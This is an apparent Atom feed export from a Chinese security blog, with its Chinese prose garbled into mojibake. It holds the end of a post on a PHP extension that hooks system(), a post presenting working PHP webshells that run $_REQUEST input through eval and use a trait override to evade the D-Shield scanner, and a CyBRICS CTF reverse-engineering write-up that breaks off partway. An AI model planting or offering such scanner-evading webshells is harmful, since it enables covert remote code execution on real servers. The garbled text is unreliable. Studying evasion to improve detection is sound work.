çš„æ“ä½œç‰›é€¼,<br>åŠ«æŒ op code çš„æ‰§è¡Œå¯ä»¥æ‹¦æˆª eval, echo ä¹‹ç±»çš„å…³é”®å­—, è€ŒåŠ«æŒå‡½æ•°è¡¨åªèƒ½åŠ«æŒå‡½æ•°, ç›¸å¯¹æ›´å±€é™ä¸€äº›.<br>è€Œä¸”æˆ‘çš„å®ç°æ„Ÿè§‰ 100% æœ‰å†…å­˜æ³„éœ² (é€ƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span>* internal_func_name = <span class="string">"system"</span>; <span class="comment">// å†…ç½®å‡½æ•°å</span></span><br><span class="line">    <span class="keyword">char</span>* new_internal_func_name = <span class="string">"__internal__"</span>; <span class="comment">// æ–°å†…ç½®å‡½æ•°å</span></span><br><span class="line"></span><br><span class="line">    zend_internal_function *internal_func = zend_hash_str_find_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line">    zend_internal_function *copy_internal_func = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    <span class="built_in">memcpy</span>(copy_internal_func, internal_func, <span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), new_internal_func_name, <span class="built_in">strlen</span>(new_internal_func_name), copy_internal_func);</span><br><span class="line">    zend_hash_str_del(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *replace_code = <span class="string">"function __temp__($a) &#123;var_dump($a);if (preg_match('/bash/i', $a) === 0) &#123;__internal__($a);&#125; else &#123;echo $a.' is banned';&#125;&#125;;"</span>; <span class="comment">// æ›¿æ¢çš„å‡½æ•°ä»£ç </span></span><br><span class="line"></span><br><span class="line">    zend_eval_string(replace_code, <span class="literal">NULL</span> , <span class="string">""</span>);</span><br><span class="line">    zend_op_array *replace_func = zend_hash_str_find_ptr(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line"></span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name), replace_func);</span><br><span class="line">    *(replace_func-&gt;refcount) += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_del(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP ç±»ä¼¼äº python ä¹Ÿæ˜¯è¿è¡Œåœ¨è§£é‡Šå™¨ä¸Šçš„, PHP çš„å« zend, python çš„å« cpython,&lt;br&gt;è¿™äº›éƒ½æ˜¯å®˜æ–¹å®ç°, åƒ python ä¹Ÿæœ‰ jython, pypy å•¥çš„, ç”¨å…¶ä»–è¯­è¨€å†™çš„è§£é‡Šå™¨.  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="php" scheme="https://rmb122.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨ PHP Trait ç‰¹æ€§ç»•è¿‡ D ç›¾æŸ¥æ€</title>
    <link href="https://rmb122.com/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/"/>
    <id>https://rmb122.com/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/</id>
    <published>2019-07-25T07:14:14.000Z</published>
    <updated>2019-07-25T07:39:26.516Z</updated>
    
    <content type="html"><![CDATA[<p>å¸®ç€å…¬å¸å®¡ç€ä»£ç , å‘ç°ä¸€ä¸ª PHP æŒºå¥½ç©çš„ç‰¹æ€§, çªå‘å¥‡æƒ³, æƒ³çœ‹çœ‹èƒ½ä¸èƒ½ç»• D ç›¾, æ²¡æƒ³åˆ°å°±æˆäº†.</p><a id="more"></a><p>è¿™ä¸ªç‰¹æ€§å·²ç»å†™åœ¨ Title é‡Œé¢äº†, å…·ä½“å¯ä»¥å‚è€ƒ <a href="https://www.php.net/traits" target="_blank" rel="noopener">php.net</a> ä¸Šçš„ä»‹ç»,<br>è¯´äººè¯å°±æ˜¯è¦†ç›–æ–¹æ³•, äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•, æŠŠæ— å®³çš„å˜æˆæœ‰å®³çš„.  </p><p>ä¸åºŸè¯, ç›´æ¥çœ‹ shell ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> T &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"$this-&gt;s"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I am innocent"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;s = $_REQUEST[<span class="string">'s'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">T</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dynamic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç”¨ T çš„ <code>dynamic</code> è¦†ç›–äº† B çš„ <code>dynamic</code>, å¯¼è‡´äº†ä»£ç æ‰§è¡Œ,<br>ä¸ªäººçŒœæµ‹æ˜¯ D ç›¾ä¸æ”¯æŒ <code>trait</code>, æ²¡æœ‰æŠŠé‡Œé¢çš„ eval å½“æˆä»£ç , ç›´æ¥ç»™è·³è¿‡äº†.  </p><p><img src="https://i.loli.net/2019/07/25/5d395c8b9e25359401.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8b9b5f447606.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8bbdf0329396.png" alt="">  </p><p>è€Œä¸”å¾ˆç¥å¥‡çš„æ˜¯, åœ¨è¿™ä¸€æ®µä¸‹é¢æ”¾ä¸€æ®µæœ¬æ¥è¿‡ä¸äº†çš„, ä¹Ÿèƒ½è¿‡ D ç›¾äº†.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;c = $_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> B();</span><br><span class="line">$d-&gt;a();</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰ D ç›¾å†…åº”è¯¥æœ‰å¥½å‡ ç§å¼•æ“, trait æŠŠå…¶ä¸­åŸºäºæ•°æ®æµçš„å¼•æ“ç»™æå´©äº†? äºæ˜¯ä¹Ÿå°±èƒ½è¿‡äº†.<br>æ¯”è¾ƒçš„è°œâ€¦</p><p>æœ€å, PHP è¿™ç§åŠ¨æ€è¯­è¨€, é™æ€æŸ¥æ€çš„éš¾åº¦æ˜¯çœŸçš„å¤§â€¦<br>ç‰¹åˆ«æ¶‰åŠç±», è¿‡ D ç›¾çš„å§¿åŠ¿éå¸¸å¤š, ç™¾åº¦éšä¾¿æœæœå°±æœ‰ä¸€å †. æƒ³è¦çœŸæ­£é˜²æ­¢, è¿˜æ˜¯é  rasp è¿™ç§æŠ€æœ¯å§.<br>hook eval, ç„¶åæ£€æµ‹æ•°æ®æµæ˜¯å¦æ¥è‡ª $_POST, $_GET ç­‰ç­‰</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¸®ç€å…¬å¸å®¡ç€ä»£ç , å‘ç°ä¸€ä¸ª PHP æŒºå¥½ç©çš„ç‰¹æ€§, çªå‘å¥‡æƒ³, æƒ³çœ‹çœ‹èƒ½ä¸èƒ½ç»• D ç›¾, æ²¡æƒ³åˆ°å°±æˆäº†.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="pentest" scheme="https://rmb122.com/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF Samizdat Writeup</title>
    <link href="https://rmb122.com/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/"/>
    <id>https://rmb122.com/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/</id>
    <published>2019-07-22T01:56:31.000Z</published>
    <updated>2019-07-22T03:05:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜æ˜¯åœ¨æ¯”èµ›ç»“æŸåæ‰åšå‡ºæ¥çš„, æ¯”è¾ƒå¯æƒœ, ä½†æ˜¯é¢˜ç›®æœ¬èº«è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„, æ‰€ä»¥å†™ä¸ª Writeup.<br>(æ—©çŸ¥é“æ—©ç‚¹èµ·åºŠåšé¢˜äº†</p><a id="more"></a><p>é¦–å…ˆæ‰“å¼€æ¥å¯ä»¥ä¸‹è½½  </p><ul><li>é˜…è¯»å™¨</li><li>guide.txt</li><li>ä¸¤æœ¬åŠ å¯†è¿‡çš„ä¹¦</li></ul><p>å…¶ä¸­é˜…è¯»å™¨èƒ½è§£å¯†ä¹¦, ä½†æ˜¯åªèƒ½è¯»å‰ 100 é¡µ, æ¥ä¸‹æ¥è‡ªç„¶æ˜¯ IDA F5 ä¼ºå€™ä¸€ä¸‹é˜…è¯»å™¨,  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)decrypt((<span class="keyword">unsigned</span> __int8 *)ptr, n, &amp;v11, &amp;v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decrypt book"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = decompress_book(v11, v12, &amp;v14, &amp;v13);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decompress book"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      read_book(v14, v3, v13);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶å®å°±æ˜¯è§£å¯† + zlib è§£å‹ç¼©, ç„¶åå°è¯´æœ¬ä½“ä¿å­˜å½¢å¼æ˜¯ xml, ç”¨ libxml æ¥è§£æ.</p><p>æ¥ä¸‹æ¥é€†å‘è§£å¯†ç®—æ³•, å‘ç°åœ¨ decrypt é‡Œé¢è°ƒç”¨äº† decrypt_block, å®é™…ä¸Šæ˜¯åˆ†å—å¯†ç , æ¯ 16 å­—èŠ‚åˆ†å—è§£å¯†, è€Œ decrypt_block çš„å®ç°å¦‚ä¸‹  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">        v1 += Mminus[<span class="number">16</span> * k + j] * a1[k];</span><br><span class="line">      ptr[j] = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">15</span>; ++l )</span><br><span class="line">      a1[l] = ptr[(<span class="keyword">unsigned</span> __int8)Pminus[l]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure><p>è½¬æˆ python ä»£ç å¯èƒ½æ›´å®¹æ˜“çœ‹æ‡‚, å…¶ä¸­ Mminus æ˜¯å¤§å° 256 çš„æ•°ç»„, Pminus æ˜¯å¤§å° 16 çš„æ•°ç»„, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure><p>å­¦è¿‡çº¿æ€§ä»£æ•°å¯ä»¥çœ‹å‡º, å…¶å®å°±æ˜¯ç®—äº†ä¸ªçŸ©é˜µä¹˜æ³•, ç„¶åç½®æ¢ä¸€ä¸‹, Mminus å°±æ˜¯ä¸ª 16 * 16 çš„çŸ©é˜µ.</p><p>ææ‡‚ä¹‹åå°±å¯ä»¥å†™ç®—æ³•è§£å¯†äº†, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Mminus = [</span><br><span class="line">    <span class="number">135</span>, <span class="number">25</span>, <span class="number">77</span>, <span class="number">128</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">158</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">213</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">172</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">32</span>, <span class="number">243</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">42</span>, <span class="number">81</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">25</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">228</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">102</span>, <span class="number">238</span>, <span class="number">143</span>, <span class="number">134</span>, <span class="number">142</span>, <span class="number">221</span>, <span class="number">135</span>, <span class="number">141</span>, <span class="number">241</span>, <span class="number">71</span>, <span class="number">237</span>, <span class="number">153</span>,</span><br><span class="line">    <span class="number">159</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">197</span>, <span class="number">62</span>, <span class="number">167</span>, <span class="number">79</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">164</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">15</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">163</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">123</span>, <span class="number">165</span>, <span class="number">5</span>,</span><br><span class="line">    <span class="number">106</span>, <span class="number">129</span>, <span class="number">156</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">50</span>, <span class="number">99</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">50</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">125</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">67</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">246</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">153</span>, <span class="number">102</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">209</span>, <span class="number">176</span>, <span class="number">31</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">243</span>, <span class="number">94</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">234</span>, <span class="number">223</span>, <span class="number">204</span>, <span class="number">79</span>, <span class="number">209</span>, <span class="number">222</span>,</span><br><span class="line">    <span class="number">16</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">221</span>, <span class="number">125</span>, <span class="number">90</span>, <span class="number">112</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">99</span>, <span class="number">139</span>, <span class="number">178</span>, <span class="number">137</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">57</span>, <span class="number">24</span>, <span class="number">243</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">90</span>, <span class="number">250</span>, <span class="number">132</span>, <span class="number">220</span>, <span class="number">194</span>, <span class="number">154</span>, <span class="number">121</span>, <span class="number">114</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'3ba9318b509034cb7b506df0faef4d80.fb2enc'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"><span class="comment">#f = open('6506dad64d2353f25cca891f81443a8e.fb2enc', 'rb').read()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    ptr = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t += Mminus[<span class="number">16</span> * k + j] * block[k]</span><br><span class="line">            ptr[j] = t % <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            block[l] = ptr[Pminus[l]]</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line">book = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(f), <span class="number">16</span>):</span><br><span class="line">    book.extend(decrypt_block(f[i:i + <span class="number">16</span>]))</span><br><span class="line"></span><br><span class="line">dec = zlib.decompress(bytes(book))</span><br><span class="line">open(<span class="string">'output2.xml'</span>, <span class="string">'wb'</span>).write(dec)</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å¯†ç»™çš„ä¸¤æœ¬ä¹¦, å‘ç°é‡Œé¢çœŸçš„å°±æ˜¯ä¸¤æœ¬å°è¯´ (<br>è€Œä¸”æ­£æ–‡éƒ½æ˜¯è¥¿é‡Œå°”å­—æ¯, ä¹Ÿçœ‹ä¸æ‡‚ 233</p><p>æ¥ä¸‹æ¥çš„ç›®æ ‡åº”è¯¥ä¸æ˜¯è¿™ä¸¤æœ¬å°è¯´, å†å›åˆ°ç½‘ç«™.<br>è®¿é—® robots.txt, å‘ç°ç»™äº†æç¤º  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: 